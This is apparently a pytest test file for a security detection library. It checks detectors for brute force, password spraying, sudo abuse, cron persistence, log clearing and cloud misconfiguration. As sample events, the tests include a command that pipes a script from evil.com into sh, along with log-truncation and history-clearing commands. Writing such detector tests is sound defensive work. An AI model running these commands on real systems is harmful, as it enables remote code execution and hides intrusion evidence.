"""
Detection Tests

Tests for security detection functionality.
"""

import pytest
from datetime import datetime, timedelta

from secpipe.detections import (
    DetectionRegistry,
    DetectionEngine,
    BruteForceSSHDetection,
    BruteForceWebDetection,
    CloudSecurityTriageDetection,
    PasswordSprayingDetection,
    CronPersistenceDetection,
    UnusualSudoDetection,
    LogClearingDetection,
)
from secpipe.schema import Event, EventType, Severity


class TestDetectionRegistry:
    """Tests for detection registry."""
    
    def test_list_detections(self):
        """Should list all registered detections."""
        detections = DetectionRegistry.list_detections()
        assert "brute_force_ssh" in detections
        assert "brute_force_web" in detections
        assert "cron_persistence" in detections
        assert "unusual_sudo" in detections
        assert "cloud_security_triage" in detections
    
    def test_create_detection(self):
        """Should create detection by name."""
        detection = DetectionRegistry.create("brute_force_ssh")
        assert isinstance(detection, BruteForceSSHDetection)
    
    def test_create_all(self):
        """Should create all detections."""
        detections = DetectionRegistry.create_all()
        assert len(detections) > 0
        assert all(hasattr(d, "analyze") for d in detections)
    
    def test_list_by_category(self):
        """Should list detections by category."""
        brute_force = DetectionRegistry.list_by_category("brute_force")
        assert "brute_force_ssh" in brute_force
        assert "brute_force_web" in brute_force


class TestBruteForceSSHDetection:
    """Tests for SSH brute force detection."""
    
    def test_detect_brute_force(self, sample_events):
        """Should detect SSH brute force attempt."""
        detection = BruteForceSSHDetection({"threshold": 5, "window_seconds": 300})
        findings = detection.analyze(sample_events)
        
        assert len(findings) >= 1
        finding = findings[0]
        assert finding.detection_name == "brute_force_ssh"
        assert finding.severity == Severity.HIGH
        assert finding.source_ip == "192.168.1.100"
        assert finding.mitre_attack_id == "T1110.001"
    
    def test_no_detection_below_threshold(self):
        """Should not detect with few failures."""
        detection = BruteForceSSHDetection({"threshold": 10})
        
        # Create only 3 failures
        events = [
            Event(
                timestamp=datetime.now() + timedelta(seconds=i),
                event_type=EventType.AUTH_FAILURE,
                source_parser="auth",
                raw_line="sshd: Failed password",
                source_ip="192.168.1.100",
                username="admin",
                extra={"pattern": "ssh_failed"},
            )
            for i in range(3)
        ]
        
        findings = detection.analyze(events)
        assert len(findings) == 0
    
    def test_separate_by_source_ip(self):
        """Should track failures separately by source IP."""
        detection = BruteForceSSHDetection({"threshold": 3})
        
        events = []
        for ip in ["192.168.1.100", "192.168.1.101"]:
            for i in range(2):  # 2 failures each, below threshold
                events.append(Event(
                    timestamp=datetime.now() + timedelta(seconds=i),
                    event_type=EventType.AUTH_FAILURE,
                    source_parser="auth",
                    raw_line="sshd: Failed password",
                    source_ip=ip,
                    username="admin",
                    extra={"pattern": "ssh_failed"},
                ))
        
        findings = detection.analyze(events)
        assert len(findings) == 0  # Neither IP reached threshold
    
    def test_window_expiration(self):
        """Should not count failures outside time window."""
        detection = BruteForceSSHDetection({"threshold": 5, "window_seconds": 60})
        
        events = []
        # First 3 failures
        for i in range(3):
            events.append(Event(
                timestamp=datetime.now() - timedelta(minutes=10) + timedelta(seconds=i),
                event_type=EventType.AUTH_FAILURE,
                source_parser="auth",
                raw_line="sshd: Failed",
                source_ip="192.168.1.100",
                extra={"pattern": "ssh_failed"},
            ))
        
        # Later 2 failures (outside window from first 3)
        for i in range(2):
            events.append(Event(
                timestamp=datetime.now() + timedelta(seconds=i),
                event_type=EventType.AUTH_FAILURE,
                source_parser="auth",
                raw_line="sshd: Failed",
                source_ip="192.168.1.100",
                extra={"pattern": "ssh_failed"},
            ))
        
        findings = detection.analyze(events)
        assert len(findings) == 0  # Never reached 5 in 60 seconds


class TestBruteForceWebDetection:
    """Tests for web brute force detection."""
    
    def test_detect_web_brute_force(self, sample_nginx_log_lines):
        """Should detect web authentication brute force."""
        from secpipe.parsers import NginxParser
        
        parser = NginxParser()
        events = list(parser.parse_lines(sample_nginx_log_lines))
        
        detection = BruteForceWebDetection({"threshold": 5, "window_seconds": 60})
        findings = detection.analyze(events)
        
        assert len(findings) >= 1
        finding = findings[0]
        assert finding.detection_name == "brute_force_web"
        assert "192.168.1.50" in finding.title


class TestPasswordSprayingDetection:
    """Tests for password spraying detection."""
    
    def test_detect_password_spraying(self):
        """Should detect password spraying attack."""
        detection = PasswordSprayingDetection({"min_users": 3, "window_seconds": 600})
        
        events = []
        for username in ["alice", "bob", "charlie", "david", "eve"]:
            events.append(Event(
                timestamp=datetime.now(),
                event_type=EventType.AUTH_FAILURE,
                source_parser="auth",
                raw_line="Failed password",
                source_ip="192.168.1.100",
                username=username,
            ))
        
        findings = detection.analyze(events)
        
        assert len(findings) == 1
        assert findings[0].detection_name == "password_spraying"
        assert findings[0].extra.get("unique_user_count") == 5


class TestUnusualSudoDetection:
    """Tests for unusual sudo detection."""
    
    def test_detect_high_risk_sudo(self):
        """Should detect high-risk sudo commands."""
        detection = UnusualSudoDetection()
        
        events = [
            Event(
                timestamp=datetime.now(),
                event_type=EventType.SUDO_COMMAND,
                source_parser="auth",
                raw_line="sudo: user executed bash",
                username="user",
                command="/bin/bash",
                extra={"target_user": "root"},
            ),
        ]
        
        findings = detection.analyze(events)
        
        assert len(findings) == 1
        assert "bash" in findings[0].description.lower()


class TestCronPersistenceDetection:
    """Tests for cron persistence detection."""
    
    def test_detect_cron_modification(self):
        """Should detect crontab modifications."""
        detection = CronPersistenceDetection()
        
        events = [
            Event(
                timestamp=datetime.now(),
                event_type=EventType.CRON_EDIT,
                source_parser="auth",
                raw_line="crontab: user modified crontab",
                username="attacker",
                extra={"action": "REPLACE"},
            ),
        ]
        
        findings = detection.analyze(events)
        
        assert len(findings) == 1
        assert findings[0].detection_name == "cron_persistence"
    
    def test_detect_suspicious_cron_command(self):
        """Should flag suspicious commands in cron."""
        detection = CronPersistenceDetection()
        
        events = [
            Event(
                timestamp=datetime.now(),
                event_type=EventType.CRON_EDIT,
                source_parser="auth",
                raw_line="crontab modified",
                username="user",
                command="curl http://evil.com/shell.sh | sh",
            ),
        ]
        
        findings = detection.analyze(events)
        
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH


class TestLogClearingDetection:
    """Tests for log clearing detection."""
    
    def test_detect_log_truncation(self):
        """Should detect log file truncation."""
        detection = LogClearingDetection()
        
        events = [
            Event(
                timestamp=datetime.now(),
                event_type=EventType.UNKNOWN,
                source_parser="auth",
                raw_line="echo > /var/log/auth.log",
                command="> /var/log/auth.log",
            ),
        ]
        
        findings = detection.analyze(events)
        
        assert len(findings) == 1
        assert findings[0].severity == Severity.CRITICAL
    
    def test_detect_history_clearing(self):
        """Should detect history clearing."""
        detection = LogClearingDetection()
        
        events = [
            Event(
                timestamp=datetime.now(),
                event_type=EventType.UNKNOWN,
                source_parser="auth",
                raw_line="history -c executed",
                command="history -c",
            ),
        ]
        
        findings = detection.analyze(events)
        
        assert len(findings) == 1


class TestDetectionEngine:
    """Tests for detection engine."""
    
    def test_run_all_detections(self, sample_events):
        """Should run all detections and return findings."""
        engine = DetectionEngine()
        findings = engine.run(sample_events)
        
        assert isinstance(findings, list)
        # Should find brute force at minimum
        assert len(findings) >= 1
    
    def test_filter_by_severity(self, sample_events):
        """Should filter findings by minimum severity."""
        engine = DetectionEngine(min_severity=Severity.CRITICAL)
        findings = engine.run(sample_events)
        
        # All findings should be critical or higher
        for finding in findings:
            assert finding.severity >= Severity.CRITICAL
    
    def test_sorted_by_severity(self, sample_events):
        """Should return findings sorted by severity."""
        engine = DetectionEngine()
        findings = engine.run(sample_events)
        
        if len(findings) > 1:
            # Higher severity should come first
            severities = [f.severity for f in findings]
            for i in range(len(severities) - 1):
                assert severities[i] >= severities[i + 1]


class TestCloudSecurityTriageDetection:
    """Tests for cloud security triage."""

    def test_triage_cloud_event(self):
        """Should classify and prioritize a cloud finding."""
        detection = CloudSecurityTriageDetection()
        event = Event(
            timestamp=datetime.now(),
            event_type=EventType.CONFIG_CHANGE,
            source_parser="cloud",
            raw_line='{"provider":"AWS"}',
            hostname="aws",
            file_path="arn:aws:s3:::customer-export-prod",
            extra={
                "provider": "AWS",
                "resource_id": "arn:aws:s3:::customer-export-prod",
                "resource_type": "S3 Bucket",
                "issue_type": "Public storage bucket",
                "severity": "critical",
                "owner_team": "data-platform",
                "environment": "production",
                "details": "Bucket is publicly accessible.",
                "recommended_action": "Block public access.",
            },
        )

        findings = detection.analyze([event])

        assert len(findings) == 1
        finding = findings[0]
        assert finding.detection_name == "cloud_security_triage"
        assert finding.severity == Severity.CRITICAL
        assert finding.extra["classification"] == "storage_exposure"
        assert finding.extra["priority"] == "P1"
        assert finding.extra["owner_team"] == "data-platform"
        assert "Block public access." in finding.recommendations

    def test_ignore_non_cloud_events(self):
        """Should ignore non-cloud events."""
        detection = CloudSecurityTriageDetection()
        event = Event(
            timestamp=datetime.now(),
            event_type=EventType.AUTH_FAILURE,
            source_parser="auth",
            raw_line="sshd failed password",
        )

        findings = detection.analyze([event])

        assert findings == []
